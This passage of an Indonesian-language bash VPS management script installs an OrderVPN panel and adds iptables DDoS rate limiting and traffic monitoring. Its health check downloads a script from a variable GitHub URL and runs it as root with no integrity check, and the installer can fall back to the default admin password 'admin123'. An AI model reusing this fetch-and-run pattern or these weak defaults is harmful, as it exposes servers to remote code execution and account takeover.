    command -v jq       >/dev/null 2>&1 || pkgs+=(jq)



    [[ ${#pkgs[@]} -gt 0 ]] && DEBIAN_FRONTEND=noninteractive apt-get install -y "${pkgs[@]}" >> "$LOG" 2>&1



    printf "  ${GREEN}✔${NC} Dependensi OK\n"







    # Database



    printf "  ${CYAN}▸${NC} Setup database...\n"



    DB_PASS=$(tr -dc < /dev/urandom 'a-zA-Z0-9' | fold -w 16 | head -n 1)



    # Start dan verifikasi MySQL/MariaDB



    systemctl start mysql 2>/dev/null || systemctl start mariadb 2>/dev/null



    sleep 2



    if ! mysql -u root -e "SELECT 1;" >/dev/null 2>&1; then



        echo -e "  ${RED}✘ MySQL/MariaDB tidak bisa dijalankan! Cek manual: systemctl status mysql${NC}"



        echo "  ${DIM}Pastikan tidak ada instalasi MySQL/MariaDB yang konflik${NC}"



        read -rp "  Tekan Enter untuk kembali..."; return 1



    fi



    echo -e "  ${GREEN}✔ MySQL/MariaDB aktif${NC}"



    mysql -u root 2>/dev/null << SQLEOF >> "$LOG" 2>&1



CREATE DATABASE IF NOT EXISTS ordervpn_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;



DROP USER IF EXISTS 'ordervpn'@'localhost';



CREATE USER 'ordervpn'@'localhost' IDENTIFIED BY '${DB_PASS}';



GRANT ALL PRIVILEGES ON ordervpn_db.* TO 'ordervpn'@'localhost';



FLUSH PRIVILEGES;



SQLEOF



    printf "  ${GREEN}✔${NC} Database OK\n"







    # Deploy files



    printf "  ${CYAN}▸${NC} Deploy file web...\n"



    [[ -d /var/www/html/ordervpn ]] && rm -rf /var/www/html/ordervpn.bak 2>/dev/null && mv /var/www/html/ordervpn /var/www/html/ordervpn.bak 2>/dev/null



    _ordervpn_deploy_files "$DB_PASS"







    # Import schema



    mysql -u ordervpn -p"$DB_PASS" ordervpn_db < /var/www/html/ordervpn/database.sql >> "$LOG" 2>&1



    # Generate random admin password (ganti default admin123)



    pip_install bcrypt  # pastikan bcrypt tersedia



    ADMIN_PASS=$(tr -dc < /dev/urandom 'a-zA-Z0-9' | fold -w 12 | head -n 1)



    ADMIN_HASH=$(python3 -c "



import bcrypt



h = bcrypt.hashpw('$ADMIN_PASS'.encode(), bcrypt.gensalt(10)).decode()



# PHP password_verify() butuh prefix $2y$ bukan $2b$



print(h.replace('\$2b\$', '\$2y\$'))



" 2>/dev/null)



    # Jika bcrypt gagal, fallback: gunakan PHP password_hash (PHP sudah terinstall)



    if [[ -z "$ADMIN_HASH" ]]; then



        ADMIN_HASH=$(php -r "echo password_hash('$ADMIN_PASS', PASSWORD_BCRYPT);" 2>/dev/null)



    fi



    # Jika masih gagal, fail hard - jangan lanjut dengan hash broken



    if [[ -z "$ADMIN_HASH" ]]; then



        echo -e "  ${RED}✘ Gagal generate password hash! Pastikan bcrypt/python3 atau PHP tersedia.${NC}"



        echo -e "  ${YELLOW}Admin password tetap: admin123 (default)${NC}"



        echo -e "  ${RED}⚠  SEGERA ganti password admin melalui menu [9] setelah instalasi!${NC}"



    fi



    if [[ -n "$ADMIN_HASH" ]]; then



        mysql -u ordervpn -p"$DB_PASS" ordervpn_db -e "UPDATE users SET password='$ADMIN_HASH' WHERE username='admin';" >> "$LOG" 2>&1



        echo "$ADMIN_PASS" > /root/.ordervpn_admin



        chmod 600 /root/.ordervpn_admin



        echo -e "  ${GREEN}✔ Admin password acak dibuat!${NC}"



    else



        echo -e "  ${RED}⚠  PERINGATAN KEAMANAN!${NC}"



        echo -e "  ${RED}✘ Gagal hash password (Python bcrypt & PHP tidak tersedia)!${NC}"



        echo -e "  ${YELLOW}Password admin sementara: admin123${NC}"



        echo -e "  ${YELLOW}SEGERA ganti password admin melalui menu [9] setelah instalasi!${NC}"



    fi



    # Server lokal



    local IP_VPS; IP_VPS=$(get_ip 2>/dev/null || hostname -I | awk "{print \$1}")



    mysql -u ordervpn -p"$DB_PASS" ordervpn_db 2>/dev/null << SQLEOF2 >> "$LOG" 2>&1



DELETE FROM servers;



INSERT INTO servers (nama_server,code_server,lokasi,flag,harga_hari,harga_bulan,host,port,ssh_user,status)



VALUES ('VPS Lokal (Youzin Crabz)','local1','Indonesia (Lokal)','🇮🇩',300,9000,'${IP_VPS}',22,'root','ready');



SQLEOF2



    printf "  ${GREEN}✔${NC} File web & database OK\n"







    # Bridge



    printf "  ${CYAN}▸${NC} Deploy vpn-api bridge...\n"



    _ordervpn_deploy_bridge



    printf "  ${GREEN}✔${NC} vpn-api OK\n"







    # Nginx



    printf "  ${CYAN}▸${NC} Setup Nginx port 8888...\n"



    _ordervpn_setup_nginx 8888 "$SUBDOMAIN"



    printf "  ${GREEN}✔${NC} Nginx OK\n"







    # UFW - buka port 8888



    if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "active"; then



        ufw allow 8888/tcp >/dev/null 2>&1



        printf "  ${GREEN}✔${NC} UFW port 8888 dibuka\n"



    fi







    # Cron



    local cl="0 * * * * php /var/www/html/ordervpn/cron/expire_accounts.php >> /var/log/ordervpn_cron.log 2>&1"



    crontab -l 2>/dev/null | grep -q "ordervpn" || (crontab -l 2>/dev/null; echo "$cl") | crontab -







    # Permissions



    chown -R www-data:www-data /var/www/html/ordervpn



    chmod -R 755 /var/www/html/ordervpn



    chmod -R 775 /var/www/html/ordervpn/uploads







    # Save credentials



    cat > /root/.ordervpn_db << CREDEOF



DB_HOST=localhost



DB_USER=ordervpn



DB_PASS=${DB_PASS}



DB_NAME=ordervpn_db



CREDEOF



    chmod 600 /root/.ordervpn_db







    echo ""



    printf "  ${GREEN}╔══════════════════════════════════════════════╗${NC}\n"



    printf "  ${GREEN}║  ✔  ORDERVPN v2.0 BERHASIL DIINSTALL!       ║${NC}\n"



    printf "  ${GREEN}╚══════════════════════════════════════════════╝${NC}\n"



    echo ""



    echo -e "  ${RED}⚠ PENTING! Ganti password admin via menu [9] atau web panel /change_password.php${NC}"



    printf "  ${WHITE}URL Panel   :${NC} ${CYAN}http://%s:8888${NC}\n" "$IP_VPS"



    [[ -n "$SUBDOMAIN" ]] && printf "  ${WHITE}Subdomain   :${NC} ${CYAN}http://%s${NC}\n" "$SUBDOMAIN"



    if [[ -f /root/.ordervpn_admin ]]; then



        local ap; ap=$(cat /root/.ordervpn_admin)



        printf "  ${WHITE}Admin Login :${NC} admin / ${GREEN}%s${NC}\n" "$ap"



        echo -e "  ${RED}⚠ SIMPAN PASSWORD INI! Tidak akan ditampilkan lagi.${NC}"



    else



        printf "  ${WHITE}Admin Login :${NC} admin / admin123 ${RED}(SEGERA GANTI!)${NC}\n"



    fi



    printf "  ${YELLOW}  ⚠ Ganti password admin setelah login!${NC}\n"



    echo ""



    printf "  ${DIM}Setup lanjutan di Admin Panel → Pengaturan:${NC}\n"



    printf "  ${DIM}  · Isi kontak WA/Telegram/Instagram${NC}\n"



    printf "  ${DIM}  · Upload QRIS, isi Dana/GoPay/ShopeePay${NC}\n"



    printf "  ${DIM}  · Isi SMTP Gmail untuk OTP email${NC}\n"



    printf "  ${DIM}  · Tambah VPS lain di menu Server${NC}\n"



    echo ""



    read -rp "  Tekan ENTER..."



}











#================================================



# DDoS BASIC PROTECTION — Rate Limiting iptables



#================================================















_ddos_ensure_chain() {



    local chain="$1" table="${2:-filter}"



    if ! iptables -t "$table" -L "$chain" -n 2>/dev/null | grep -q .; then



        iptables -t "$table" -N "$chain" 2>/dev/null || true



    fi



}







setup_ddos_protection() {



    clear



    print_menu_header "DDoS BASIC PROTECTION"







    local fw_backend



    detect_firewall_backend



    fw_backend=$FW_BACKEND







    if [[ "$fw_backend" == "nftables" ]]; then



        echo -e "  ${YELLOW}Mendeteksi nftables. Script ini akan mengkonversi ke iptables rules.${NC}"



    fi







    # Cek apakah sudah aktif



    local ddos_active=0



    if iptables -L INPUT -n 2>/dev/null | grep -q "DDOS-RULES"; then



        ddos_active=1



    fi







    if [[ "$ddos_active" -eq 1 ]]; then



        echo -e "  ${GREEN}DDoS Protection sudah AKTIF!${NC}"



        echo ""



        echo -e "  ${WHITE}[1]${NC} Lihat Status & Statistik"



        echo -e "  ${WHITE}[2]${NC} Konfigurasi Threshold"



        echo -e "  ${WHITE}[3]${NC} Nonaktifkan DDoS Protection"



        echo -e "  ${WHITE}[4]${NC} Aktifkan Ulang"



        echo -e "  ${WHITE}[0]${NC} Kembali"



        echo ""



        read -rp "  Pilih [0-4]: " ddos_choice



        case $ddos_choice in



            1) _ddos_show_status ;;



            2) _ddos_config_menu ;;



            3) _ddos_disable ;;



            4) _ddos_enable ;;



            *) return ;;



        esac



        return



    fi







    echo -e "  ${CYAN}Mengaktifkan DDoS Basic Protection...${NC}"



    echo ""



    _ddos_enable



}



_ddos_enable() {



    echo -e "  ${CYAN}Creating DDoS protection rules...${NC}"







    # Baca konfigurasi threshold dari file (atau gunakan default)



    local SYN_LIMIT=20 SYN_BURST=40 CONN_LIMIT=30 ICMP_LIMIT=5



    local SSH_LIMIT=10 SSH_WINDOW=60 DROPBEAR_LIMIT=10 DROPBEAR_WINDOW=60







    if [[ -f "$DDOS_CONFIG" ]]; then



        local cfg



        cfg=$(cat "$DDOS_CONFIG")



        [[ "$cfg" =~ SYN_LIMIT=([0-9]+) ]]   && SYN_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ SYN_BURST=([0-9]+) ]]  && SYN_BURST=${BASH_REMATCH[1]}



        [[ "$cfg" =~ CONN_LIMIT=([0-9]+) ]]  && CONN_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ ICMP_LIMIT=([0-9]+) ]]  && ICMP_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ SSH_LIMIT=([0-9]+) ]]   && SSH_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ SSH_WINDOW=([0-9]+) ]]  && SSH_WINDOW=${BASH_REMATCH[1]}



        [[ "$cfg" =~ DROPBEAR_LIMIT=([0-9]+) ]] && DROPBEAR_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ DROPBEAR_WINDOW=([0-9]+) ]] && DROPBEAR_WINDOW=${BASH_REMATCH[1]}



    fi







    # Buat chain khusus untuk DDoS



    _ddos_ensure_chain "DDOS-RULES"



    _ddos_ensure_chain "DDOS-PORTSCAN"







    # Reset



    iptables -F DDOS-RULES 2>/dev/null || true



    iptables -F DDOS-PORTSCAN 2>/dev/null || true







    # 1. SYN-FLOOD PROTECTION



    iptables -A DDOS-RULES -p tcp --syn -m limit --limit ${SYN_LIMIT}/s --limit-burst ${SYN_BURST} -j RETURN



    iptables -A DDOS-RULES -p tcp --syn -j LOG --log-prefix "[DDOS-SYNFLOOD] " --log-level 4 2>/dev/null



    iptables -A DDOS-RULES -p tcp --syn -j DROP







    # 2. CONNECTION RATE LIMIT



    iptables -A DDOS-RULES -m state --state NEW -m recent --name DDOS --set



    iptables -A DDOS-RULES -m state --state NEW -m recent --name DDOS --update --seconds 1 --hitcount ${CONN_LIMIT} -j LOG --log-prefix "[DDOS-CONNECT] " 2>/dev/null



    iptables -A DDOS-RULES -m state --state NEW -m recent --name DDOS --update --seconds 1 --hitcount ${CONN_LIMIT} -j DROP







    # 3. PORT SCAN PROTECTION



    iptables -A DDOS-PORTSCAN -p tcp --tcp-flags ALL NONE -j LOG --log-prefix "[DDOS-NULLSCAN] " 2>/dev/null



    iptables -A DDOS-PORTSCAN -p tcp --tcp-flags ALL NONE -j DROP



    iptables -A DDOS-PORTSCAN -p tcp --tcp-flags ALL ALL -j LOG --log-prefix "[DDOS-XMASSCAN] " 2>/dev/null



    iptables -A DDOS-PORTSCAN -p tcp --tcp-flags ALL ALL -j DROP



    iptables -A DDOS-PORTSCAN -p tcp --tcp-flags ALL FIN -j LOG --log-prefix "[DDOS-FINSCAN] " 2>/dev/null



    iptables -A DDOS-PORTSCAN -p tcp --tcp-flags ALL FIN -j DROP







    # 4. DROP INVALID PACKETS



    iptables -A DDOS-RULES -m state --state INVALID -j DROP







    # 5. LIMIT ICMP (ping flood)



    iptables -A DDOS-RULES -p icmp -m limit --limit ${ICMP_LIMIT}/s -j ACCEPT



    iptables -A DDOS-RULES -p icmp -j DROP







    # 6. LIMIT SSH



    iptables -A DDOS-RULES -p tcp --dport 22 -m state --state NEW -m recent --name SSH --set



    iptables -A DDOS-RULES -p tcp --dport 22 -m state --state NEW -m recent --name SSH --update --seconds ${SSH_WINDOW} --hitcount ${SSH_LIMIT} -j LOG --log-prefix "[DDOS-SSH] " 2>/dev/null



    iptables -A DDOS-RULES -p tcp --dport 22 -m state --state NEW -m recent --name SSH --update --seconds ${SSH_WINDOW} --hitcount ${SSH_LIMIT} -j DROP







    # 7. LIMIT DROPBEAR



    iptables -A DDOS-RULES -p tcp --dport 222 -m state --state NEW -m recent --name DROPBEAR --set



    iptables -A DDOS-RULES -p tcp --dport 222 -m state --state NEW -m recent --name DROPBEAR --update --seconds ${DROPBEAR_WINDOW} --hitcount ${DROPBEAR_LIMIT} -j DROP







    # Hook chain ke INPUT



    iptables -C INPUT -j DDOS-PORTSCAN 2>/dev/null || iptables -I INPUT 1 -j DDOS-PORTSCAN 2>/dev/null || true



    iptables -C INPUT -j DDOS-RULES 2>/dev/null || iptables -I INPUT 2 -j DDOS-RULES 2>/dev/null || true







    # Simpan konfigurasi threshold + status aktif



    cat > "$DDOS_CONFIG" << DDOSCFG



SYN_LIMIT=${SYN_LIMIT}



SYN_BURST=${SYN_BURST}



CONN_LIMIT=${CONN_LIMIT}



ICMP_LIMIT=${ICMP_LIMIT}



SSH_LIMIT=${SSH_LIMIT}



SSH_WINDOW=${SSH_WINDOW}



DROPBEAR_LIMIT=${DROPBEAR_LIMIT}



DROPBEAR_WINDOW=${DROPBEAR_WINDOW}



ACTIVE=1



DDOSCFG







    # Simpan iptables rules



    mkdir -p /etc/iptables



    iptables-save > /etc/iptables/rules.v4 2>/dev/null || true







    # Buat systemd service untuk restore rules saat reboot



    cat > /etc/systemd/system/ddos-protection.service << 'DDOSEOF'



[Unit]



Description=DDoS Basic Protection Rules



After=network.target



Before=iptables.service







[Service]



Type=oneshot



RemainAfterExit=yes



ExecStart=/sbin/iptables-restore /etc/iptables/rules.v4



ExecStop=/sbin/iptables -F DDOS-RULES 2>/dev/null; /sbin/iptables -D INPUT -j DDOS-RULES 2>/dev/null; /sbin/iptables -F DDOS-PORTSCAN 2>/dev/null; /sbin/iptables -D INPUT -j DDOS-PORTSCAN 2>/dev/null







[Install]



WantedBy=multi-user.target



DDOSEOF



    systemctl daemon-reload 2>/dev/null

    # Pastikan iptables tersedia (Ubuntu 22+ default nftables)
    command -v iptables >/dev/null 2>&1 || {
        apt-get install -y iptables >/dev/null 2>&1 || true
    }

    systemctl enable ddos-protection 2>/dev/null || true







    echo -e "  ${GREEN}DDoS Basic Protection AKTIF!${NC}"



    echo -e "  ${DIM}  Thresholds: SYN=${SYN_LIMIT}/s, Conn=${CONN_LIMIT}/s, ICMP=${ICMP_LIMIT}/s, SSH=${SSH_LIMIT}/${SSH_WINDOW}s${NC}"



    sleep 2



}



_ddos_disable() {



    echo -e "  ${YELLOW}Menonaktifkan DDoS Protection...${NC}"







    # Remove chain hooks



    iptables -D INPUT -j DDOS-PORTSCAN 2>/dev/null || true



    iptables -D INPUT -j DDOS-RULES 2>/dev/null || true







    # Flush chains



    iptables -F DDOS-RULES 2>/dev/null || true



    iptables -F DDOS-PORTSCAN 2>/dev/null || true







    # Delete chains



    iptables -X DDOS-RULES 2>/dev/null || true



    iptables -X DDOS-PORTSCAN 2>/dev/null || true







    # Disable & stop service



    systemctl stop ddos-protection 2>/dev/null || true



    systemctl disable ddos-protection 2>/dev/null || true



    rm -f "$DDOS_CONFIG"







    echo -e "  ${GREEN}✔ DDoS Protection dinonaktifkan!${NC}"



    sleep 2



}







_ddos_config_menu() {



    clear



    print_menu_header "DDOS THRESHOLD CONFIG"







    local SYN_LIMIT=20 SYN_BURST=40 CONN_LIMIT=30 ICMP_LIMIT=5



    local SSH_LIMIT=10 SSH_WINDOW=60 DROPBEAR_LIMIT=10 DROPBEAR_WINDOW=60







    if [[ -f "$DDOS_CONFIG" ]]; then



        local cfg



        cfg=$(cat "$DDOS_CONFIG")



        [[ "$cfg" =~ SYN_LIMIT=([0-9]+) ]]   && SYN_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ SYN_BURST=([0-9]+) ]]  && SYN_BURST=${BASH_REMATCH[1]}



        [[ "$cfg" =~ CONN_LIMIT=([0-9]+) ]]  && CONN_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ ICMP_LIMIT=([0-9]+) ]]  && ICMP_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ SSH_LIMIT=([0-9]+) ]]   && SSH_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ SSH_WINDOW=([0-9]+) ]]  && SSH_WINDOW=${BASH_REMATCH[1]}



        [[ "$cfg" =~ DROPBEAR_LIMIT=([0-9]+) ]] && DROPBEAR_LIMIT=${BASH_REMATCH[1]}



        [[ "$cfg" =~ DROPBEAR_WINDOW=([0-9]+) ]] && DROPBEAR_WINDOW=${BASH_REMATCH[1]}



    fi







    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}CURRENT THRESHOLDS${NC}"



    _box_divider $W



    printf "  ${WHITE}1.${NC} SYN Flood Limit      : ${CYAN}%d/s${NC} (burst: %d)\n" $SYN_LIMIT $SYN_BURST



    printf "  ${WHITE}2.${NC} Connection Limit     : ${CYAN}%d/s${NC}\n" $CONN_LIMIT



    printf "  ${WHITE}3.${NC} ICMP/Ping Limit      : ${CYAN}%d/s${NC}\n" $ICMP_LIMIT



    printf "  ${WHITE}4.${NC} SSH Limit            : ${CYAN}%d/%ds${NC}\n" $SSH_LIMIT $SSH_WINDOW



    printf "  ${WHITE}5.${NC} Dropbear Limit       : ${CYAN}%d/%ds${NC}\n" $DROPBEAR_LIMIT $DROPBEAR_WINDOW



    _box_divider $W



    echo -e "  ${YELLOW}Pilih nomor untuk mengubah, [r] Reset default, [0] Kembali${NC}"



    echo ""



    read -rp "  Pilihan: " cfg_choice







    case $cfg_choice in



        1) read -rp "  SYN Limit (/s): " v; [[ "$v" =~ ^[0-9]+$ ]] && sed -i "s/SYN_LIMIT=.*/SYN_LIMIT=$v/" "$DDOS_CONFIG" 2>/dev/null



           read -rp "  SYN Burst: " v2; [[ "$v2" =~ ^[0-9]+$ ]] && sed -i "s/SYN_BURST=.*/SYN_BURST=$v2/" "$DDOS_CONFIG" 2>/dev/null ;;



        2) read -rp "  Connection Limit (/s): " v; [[ "$v" =~ ^[0-9]+$ ]] && sed -i "s/CONN_LIMIT=.*/CONN_LIMIT=$v/" "$DDOS_CONFIG" 2>/dev/null ;;



        3) read -rp "  ICMP Limit (/s): " v; [[ "$v" =~ ^[0-9]+$ ]] && sed -i "s/ICMP_LIMIT=.*/ICMP_LIMIT=$v/" "$DDOS_CONFIG" 2>/dev/null ;;



        4) read -rp "  SSH Limit (koneksi): " v; [[ "$v" =~ ^[0-9]+$ ]] && sed -i "s/SSH_LIMIT=.*/SSH_LIMIT=$v/" "$DDOS_CONFIG" 2>/dev/null



           read -rp "  SSH Window (detik): " v2; [[ "$v2" =~ ^[0-9]+$ ]] && sed -i "s/SSH_WINDOW=.*/SSH_WINDOW=$v2/" "$DDOS_CONFIG" 2>/dev/null ;;



        5) read -rp "  Dropbear Limit (koneksi): " v; [[ "$v" =~ ^[0-9]+$ ]] && sed -i "s/DROPBEAR_LIMIT=.*/DROPBEAR_LIMIT=$v/" "$DDOS_CONFIG" 2>/dev/null



           read -rp "  Dropbear Window (detik): " v2; [[ "$v2" =~ ^[0-9]+$ ]] && sed -i "s/DROPBEAR_WINDOW=.*/DROPBEAR_WINDOW=$v2/" "$DDOS_CONFIG" 2>/dev/null ;;



        r|R)



            cat > "$DDOS_CONFIG" << DDOSCFG



SYN_LIMIT=20



SYN_BURST=40



CONN_LIMIT=30



ICMP_LIMIT=5



SSH_LIMIT=10



SSH_WINDOW=60



DROPBEAR_LIMIT=10



DROPBEAR_WINDOW=60



ACTIVE=1



DDOSCFG



            echo -e "  ${GREEN}Threshold direset ke default!${NC}" ;;



        0|*) return ;;



    esac



    echo -e "  ${GREEN}Updated! Jalankan [Aktifkan Ulang] agar efek.${NC}"



    sleep 2



}







_ddos_show_status() {



    clear



    print_menu_header "DDoS PROTECTION STATUS"







    local active_rule_count



    active_rule_count=$(iptables -L DDOS-RULES -n 2>/dev/null | wc -l)







    if [[ "$active_rule_count" -le 2 ]]; then



        echo -e "  ${RED}✘ DDoS Protection TIDAK AKTIF${NC}"



        echo ""



        read -rp "  Tekan Enter untuk kembali..."



        return



    fi







    echo -e "  ${GREEN}✔ DDoS Protection: AKTIF${NC}"



    echo ""



    echo -e "  ${CYAN}DDOS-RULES Chain:${NC}"



    iptables -L DDOS-RULES -n -v --line-numbers 2>/dev/null | head -40 | while IFS= read -r line; do



        echo -e "  ${DIM}${line}${NC}"



    done



    echo ""



    echo -e "  ${CYAN}DDOS-PORTSCAN Chain:${NC}"



    iptables -L DDOS-PORTSCAN -n -v --line-numbers 2>/dev/null | head -20 | while IFS= read -r line; do



        echo -e "  ${DIM}${line}${NC}"



    done



    echo ""



    echo -e "  ${YELLOW}Packet counters:${NC}"



    local dropped



    dropped=$(iptables -L DDOS-RULES -n -v 2>/dev/null | tail -1 | awk '{print $1}')



    echo -e "  ${WHITE}Total dropped packets: ${RED}${dropped:-0}${NC}"



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







#================================================



# TRAFFIC MONITOR — Bandwidth Per User



#================================================







traffic_monitor_menu() {



    while true; do



        clear



        print_menu_header "TRAFFIC MONITOR"







        echo -e "  ${WHITE}[1]${NC} Aktifkan Traffic Monitor"



        echo -e "  ${WHITE}[2]${NC} Lihat Traffic Per User"



        echo -e "  ${WHITE}[3]${NC} Lihat Total Traffic Server"



        echo -e "  ${WHITE}[4]${NC} Reset Traffic Counter"



        echo -e "  ${WHITE}[5]${NC} Nonaktifkan Traffic Monitor"



        echo -e "  ${WHITE}[0]${NC} Kembali"



        echo ""



        read -rp "  Pilih [0-5]: " tp_choice



        case $tp_choice in



            0) break ;;



            1) _traffic_enable ;;



            2) _traffic_show_users ;;



            3) _traffic_show_total ;;



            4) _traffic_reset ;;



            5) _traffic_disable ;;



            *) echo -e "  ${RED}Pilihan tidak valid!${NC}"; sleep 1 ;;



        esac



    done



}

#================================================
# HEALTH CHECK — Quick Test Semua Service
#================================================

_health_check() {
    clear
    if [[ -f /root/quick-test.sh ]]; then
        bash /root/quick-test.sh
    elif [[ -f ./quick-test.sh ]]; then
        bash ./quick-test.sh
    else
        # Download dari GitHub
        if curl -sL --max-time 10 https://raw.githubusercontent.com/${GITHUB_USER}/hide/main/quick-test.sh -o /root/quick-test.sh 2>/dev/null; then
            chmod +x /root/quick-test.sh
            bash /root/quick-test.sh
        else
            echo -e "  ${RED}✘ Gagal download quick-test.sh!${NC}"
            echo -e "  ${DIM}Manual: wget https://raw.githubusercontent.com/${GITHUB_USER}/hide/main/quick-test.sh${NC}"
        fi
    fi
    echo ""
    read -rp "  Tekan ENTER untuk kembali..."
}








_traffic_enable() {



    clear



    print_menu_header "AKTIFKAN TRAFFIC MONITOR"







    # Cek apakah sudah aktif



    if iptables -L TRAFFIC-IN -n 2>/dev/null | grep -q .; then



        echo -e "  ${YELLOW}⚠ Traffic Monitor sudah aktif!${NC}"



        sleep 2



        return



    fi







    echo -e "  ${CYAN}Membuat rules monitoring traffic...${NC}"







    # Buat chains



    iptables -N TRAFFIC-IN 2>/dev/null || true



    iptables -N TRAFFIC-OUT 2>/dev/null || true







    # Reset



    iptables -F TRAFFIC-IN 2>/dev/null || true



    iptables -F TRAFFIC-OUT 2>/dev/null || true







    # Monitor traffic ke port-port VPN



    # SSH



    iptables -A TRAFFIC-IN -p tcp --dport 22 -j ACCEPT



    iptables -A TRAFFIC-OUT -p tcp --sport 22 -j ACCEPT



    # Dropbear



    iptables -A TRAFFIC-IN -p tcp --dport 222 -j ACCEPT



    iptables -A TRAFFIC-OUT -p tcp --sport 222 -j ACCEPT



    # HTTP/HTTPS



    iptables -A TRAFFIC-IN -p tcp --dport 80 -j ACCEPT



    iptables -A TRAFFIC-OUT -p tcp --sport 80 -j ACCEPT



    iptables -A TRAFFIC-IN -p tcp --dport 443 -j ACCEPT



    iptables -A TRAFFIC-OUT -p tcp --sport 443 -j ACCEPT



    # Download port



    iptables -A TRAFFIC-IN -p tcp --dport 81 -j ACCEPT



    iptables -A TRAFFIC-OUT -p tcp --sport 81 -j ACCEPT



    # Xray internal ports



    for port in 8080 8081 8082 8444 8445 8446; do



        iptables -A TRAFFIC-IN -p tcp --dport $port -j ACCEPT



        iptables -A TRAFFIC-OUT -p tcp --sport $port -j ACCEPT



    done



    # BadVPN UDP



    iptables -A TRAFFIC-IN -p udp --dport 7100:7300 -j ACCEPT



    iptables -A TRAFFIC-OUT -p udp --sport 7100:7300 -j ACCEPT







    # Hook ke INPUT dan OUTPUT



    iptables -I INPUT 1 -j TRAFFIC-IN 2>/dev/null || true



    iptables -I OUTPUT 1 -j TRAFFIC-OUT 2>/dev/null || true







    # Buat direktori cache



    mkdir -p "$TRAFFIC_DIR"



    # Buat cron untuk auto-save traffic counters setiap jam



    if ! crontab -l 2>/dev/null | grep -q "traffic_save"; then



        (crontab -l 2>/dev/null; echo "0 * * * * iptables -L TRAFFIC-IN -n -v 2>/dev/null > "$TRAFFIC_DIR"/save_in.txt; iptables -L TRAFFIC-OUT -n -v 2>/dev/null > "$TRAFFIC_DIR"/save_out.txt") | crontab - 2>/dev/null



    fi











    echo -e "  ${GREEN}✔ Traffic Monitor AKTIF!${NC}"



    echo -e "  ${DIM}  Monitoring: SSH, Dropbear, HTTP/HTTPS, Xray, BadVPN${NC}"



    sleep 2



}







_traffic_disable() {



    echo -e "  ${YELLOW}Menonaktifkan Traffic Monitor...${NC}"







    iptables -D INPUT -j TRAFFIC-IN 2>/dev/null || true



    iptables -D OUTPUT -j TRAFFIC-OUT 2>/dev/null || true



    iptables -F TRAFFIC-IN 2>/dev/null || true



    iptables -F TRAFFIC-OUT 2>/dev/null || true



    iptables -X TRAFFIC-IN 2>/dev/null || true



    iptables -X TRAFFIC-OUT 2>/dev/null || true







    # Hapus cron auto-save



    if crontab -l 2>/dev/null | grep -q "traffic_save"; then



        crontab -l 2>/dev/null | grep -v "traffic_save" | crontab - 2>/dev/null || true



    fi







    rm -rf "$TRAFFIC_DIR" 2>/dev/null







    echo -e "  ${GREEN}Traffic Monitor dinonaktifkan!${NC}"



    sleep 2



}



_traffic_show_total() {



    clear



    print_menu_header "TOTAL TRAFFIC SERVER"







    if ! iptables -L TRAFFIC-IN -n 2>/dev/null | grep -q .; then



        echo -e "  ${RED}✘ Traffic Monitor tidak aktif! Aktifkan dulu [1].${NC}"



        echo ""



        read -rp "  Tekan Enter untuk kembali..."



        return



    fi







    local in_bytes out_bytes



    in_bytes=$(iptables -L TRAFFIC-IN -n -v 2>/dev/null | tail -1 | awk '{print $2}')



    out_bytes=$(iptables -L TRAFFIC-OUT -n -v 2>/dev/null | tail -1 | awk '{print $2}')







    # Convert bytes to human readable



    _fmt_bytes() {



        local b=${1:-0}



        if [[ $b -ge 1073741824 ]]; then echo "$(awk "BEGIN{printf \"%.2f\",$b/1073741824}") GB"



        elif [[ $b -ge 1048576 ]]; then echo "$(awk "BEGIN{printf \"%.2f\",$b/1048576}") MB"



        elif [[ $b -ge 1024 ]]; then echo "$(awk "BEGIN{printf \"%.2f\",$b/1024}") KB"



        else echo "${b} B"; fi



    }







    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}TOTAL TRAFFIC${NC}"



    _box_divider $W



    _box_row $W "IN (Download)" "$(_fmt_bytes ${in_bytes:-0})"



    _box_row $W "OUT (Upload)"  "$(_fmt_bytes ${out_bytes:-0})"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







_traffic_show_users() {



    clear



    print_menu_header "TRAFFIC PER USER"







    # Cek apakah ada akun



    mkdir -p "$AKUN_DIR"



    local users=()



    shopt -s nullglob



    for f in "$AKUN_DIR"/*.txt; do



        local uname



        uname=$(basename "$f" .txt)



        local protocol=${uname%%-*}



        local username=${uname#*-}



        users+=("$protocol" "$username")



    done



    shopt -u nullglob







    if [[ ${#users[@]} -eq 0 ]]; then



        echo -e "  ${YELLOW}⚠ Tidak ada akun!${NC}"



        echo ""



        read -rp "  Tekan Enter untuk kembali..."



        return



    fi







    # Cek monitoring aktif



    if ! iptables -L TRAFFIC-IN -n 2>/dev/null | grep -q .; then



        echo -e "  ${RED}✘ Traffic Monitor tidak aktif! Aktifkan dulu [1].${NC}"



        echo ""



        read -rp "  Tekan Enter untuk kembali..."



        return



    fi







    local total_in=0 total_out=0



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}TRAFFIC PER USER${NC}"



    _box_divider $W







    local idx=0



    while [[ $idx -lt ${#users[@]} ]]; do



        local proto=${users[$idx]}



        local uname=${users[$((idx+1))]}







        # Dapatkan IP user (baca dari file akun)



        local ip_file="$PUBLIC_HTML/${proto}-${uname}.txt"



        if [[ -f "$ip_file" ]]; then



            local user_ip



            user_ip=$(grep -oP '(?<=IP/Host|IP VPS|IP Address)[^0-9]*[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$ip_file" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)



            if [[ -z "$user_ip" ]]; then



                user_ip="$(get_ip)"



            fi



        else



            user_ip="N/A"



        fi







